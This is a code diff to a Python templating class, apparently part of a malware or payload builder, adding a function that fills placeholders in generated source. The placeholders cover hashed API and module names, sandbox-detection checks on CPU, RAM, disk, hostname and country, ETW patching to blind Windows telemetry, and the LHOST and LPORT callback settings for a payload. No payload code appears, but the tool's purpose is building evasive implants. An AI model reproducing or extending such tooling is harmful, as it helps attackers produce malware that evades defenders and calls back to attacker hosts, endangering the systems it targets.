@@ -1,5 +1,7 @@
 import os
 import re
+from .utils import hash_obj, hash_obj_null, get_LCID
+
 
 TEMPLATE_DIR = "src/templates/"
 
@@ -125,6 +127,97 @@ class Templator:
                     self.sed_files(tag, template)
 
 
-    def step1(self, exceptions=[]):
-        tags_by_file = self.get_all_tags_from_folder(exception=exceptions)
-        self.replace_tags(tags_by_file)
+    def process_tags(self, tags_by_file, config, args, exceptions=[]):
+        not_replaced_tags = []
+        for file in tags_by_file:
+            filepath = file["filepath"]
+            tags = file["tags"]
+            for tag in tags:
+                print(f"Processing tag: {tag['raw']} (type: {tag['type']}, name: {tag['name']}") if args.verbose else None
+                if tag['replaced']:
+                    continue
+                elif tag['type'] == "MODHASH":
+                    self.sed_file(filepath, tag['raw'], hash_obj(tag['name'], "", args.verbose))
+                elif tag['type'] == "FCTHASH":
+                    self.sed_file(filepath, tag['raw'], hash_obj(tag['name'], "function", args.verbose))
+
+                elif tag['type'] == "SANDBOX":
+                    if tag['name'] == "CPU_CHECK":
+                        if config.getint("Anti-Analysis", "cpu_cores"):
+                            check_content = self.get_template(tag['name'], str(config.getint("Anti-Analysis", "cpu_cores")))
+                            self.sed_file(filepath, tag['raw'], check_content)
+                        else:
+                            print("No CPU core count for Sandbox detection set in config file. Skipping CPU check.") if args.verbose else None
+                            self.sed_file(filepath, tag['raw'], '/* No CPU check configured */')
+
+                    elif tag['name'] == "RAM_CHECK":
+                        if config.getint("Anti-Analysis", "ram_size"):
+                            check_content = self.get_template(tag['name'], str(config.getint("Anti-Analysis", "ram_size")))
+                            self.sed_file(filepath, tag['raw'], check_content)
+                        else:
+                            print("No RAM size for Sandbox detection set in config file. Skipping RAM check.") if args.verbose else None
+                            self.sed_file(filepath, tag['raw'], '/* No RAM check configured */')
+
+                    elif tag['name'] == "DISK_CHECK":
+                        if config.getint("Anti-Analysis", "disk_size"):
+                            check_content = self.get_template(tag['name'], str(config.getint("Anti-Analysis", "disk_size")))
+                            self.sed_file(filepath, tag['raw'], check_content)
+                        else:
+                            print("No Disk size for Sandbox detection set in config file. Skipping Disk check.") if args.verbose else None
+                            self.sed_file(filepath, tag['raw'], '/* No Disk check configured */')
+
+                    elif tag['name'] == "COUNTRY_CHECK":
+                        if config.get("Anti-Analysis", "avoid_countries"):
+                            check_content = self.get_template(tag['name'])
+                            self.sed_file(filepath, tag['raw'], check_content)
+                        else:
+                            self.sed_file(filepath, tag['raw'], '// Country check not enabled')
+
+                    elif tag['name'] == "AVOID_COUNTRIES":
+                        if config.get("Anti-Analysis", "avoid_countries"):
+                            countries = config.get("Anti-Analysis", "avoid_countries").split(",")
+                            countries_lcid = [str(get_LCID(country.strip())) for country in countries if country.strip()]
+                            self.sed_file(filepath, tag['raw'], "{" + ", ".join(countries_lcid) + "}")
+                        else:
+                            self.sed_file(filepath, tag['raw'], "/* No countries to avoid configured */")
+
+                    elif tag['name'] == "AVOID_HOSTNAME":
+                        if config.get("Anti-Analysis", "avoid_hostname"):
+                            res = ""
+                            for hostname in config.get("Anti-Analysis", "avoid_hostname").split(","):
+                                hostname = hostname.strip()
+                                if hostname:
+                                    res += hash_obj("", hostname, args.verbose) + ","
+                            self.sed_file(filepath, tag['raw'], res[:-1])
+                        else:
+                            self.sed_file(filepath, tag['raw'], "/* No hostnames to avoid configured */")
+
+                    elif tag['name'] == "TARGET_HOSTNAME":
+                        if config.get("Anti-Analysis", "target_hostname"):
+                            hashed_hostname = hash_obj("", config.get("Anti-Analysis", "target_hostname"), args.verbose)
+                            self.sed_file(filepath, tag['raw'], hashed_hostname)
+                        else:
+                            self.sed_file(filepath, tag['raw'], hash_obj_null())
+
+                elif tag['type'] == "EVASION":
+                    if tag['name'] == "ETW_PATCHING":
+                        if args.etw:
+                            self.sed_file(filepath, tag['raw'], "patch_etw();")
+                        else:
+                            self.sed_file(filepath, tag['raw'], "// ETW patching not enabled")
+
+                elif not tag['type']:
+                    if tag['name'] == "LHOST":
+                        if config.get("Payload", "lhost"):
+                            self.sed_file(filepath, tag['raw'], config.get("Payload", "lhost"))
+                        else:
+                            raise ValueError("LHOST is not set in the configuration (.conf) file.")
+                    elif tag['name'] == "LPORT":
+                        if config.get("Payload", "lport"):
+                            self.sed_file(filepath, tag['raw'], config.get("Payload", "lport"))
+                        else:
+                            raise ValueError("LPORT is not set in the configuration (.conf) file.")
+                else:
+                    not_replaced_tags.append(tag)
+
+        return not_replaced_tags
